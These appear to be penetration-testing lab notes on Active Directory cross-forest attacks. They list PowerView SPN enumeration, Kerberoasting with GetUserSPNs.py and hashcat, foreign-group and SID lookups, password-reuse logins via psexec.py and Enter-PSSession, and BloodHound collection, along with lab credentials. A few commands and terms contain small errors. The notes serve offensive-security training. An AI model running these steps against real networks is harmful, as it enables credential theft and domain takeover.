-----
# FROM WINDOWS
-----
### Enumerate Accounts for Associate SPNs Using Get-DomainUser
```PowerShell
 Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | selet SamAccountName

samaccountname
--------------
krbtgt
mssqlsvc
sapsso
```

### Enumerate found account
```bash
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity sapsso | select samaccountname, memberof

samaccountname memberof
-------------- --------
sapsso         CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
```

-  The above input shows this account` is a member of "Domain Admins" group


- Perform a Kerberoasting Attack with Rubeus
```PowerShell
hashcat -m 13100 hashes rockyou -o cracked.txt
```

## Admin Password Reuse & Group Membership
- Domain A has a user adm_bob.smith in Domain Admins group, while domain B has bsmith_admin -> worth trying reuse password.
- Enumerate groups with users that do not belong to the domain using [Get-DomainForeignGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainForeignGroupMember/)

```PowerShell
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL

GroupDomain             : FREIGHTLOGISTICS.LOCAL
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
MemberDomain            : FREIGHTLOGISTICS.LOCAL
MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipal
                          s,DC=FREIGHTLOGISTICS,DC=LOCAL

# Resolve the SID 
Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500

INLANEFREIGHT\administrator
```

- We found the FREIGHTLOGISTICS.LOCAL has the built-in Administrator account 

- Confirm the access using `Enter-PSSession`
```PowerShell
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator

# ACADEMY-EA-DC03 can be found when using Rubeus
```

- If we're successful, we can confirm we can log into the DC03 Domain using INLANEFREIGHT/administrator account

-----
# FROM LINUX
-----

## Cross-Forest Kerberoasting
### Use GetUserSPNs.py
```bash
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley #transporter@4

Password:
ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation 
-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never> 
```

- Rerun the command with `-request` flag to retrieve TGT ticket.
```bash
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley -request -outputfile $FILENAME
```

- Crack the hashes with HashCat with `-m 13100`

- If successful, check if this account exists in our current domain and if it suffers from password re-use.

- Log into the machine using psexec.py
```bash
psexec.py freightlogistics.local/sapsso@academy-ea-dc03.freightlogistics.local
```

### Hunting Foreign Group Membership with BloodHound-python
- Add INLANEFREIGHT.LOCAL to /etc/resolv.conf
```bash
sudo nano /etc/resolv.conf

# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "resolvectl status" to see details about the actual nameservers.

#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5
```

- Running BloodHound against the target
```bash
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
```

- Compress the file
```bash
zip -r ilfreight_bh.zip *.json
```

- Adding FREIGHTLOGISTICS.LOCAL to /etc/resolv.conf
```bash
sudo nano /etc/resolv.conf

# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "resolvectl status" to see details about the actual nameservers.

#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain FREIGHTLOGISTICS.LOCAL
nameserver 172.16.5.238
```

- Run BloodHound against FREIGHTLOGISTICS.LOCAL
```bash
bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
```

- Zip the json files
- Upload both zip files to BloodHound for analysis.

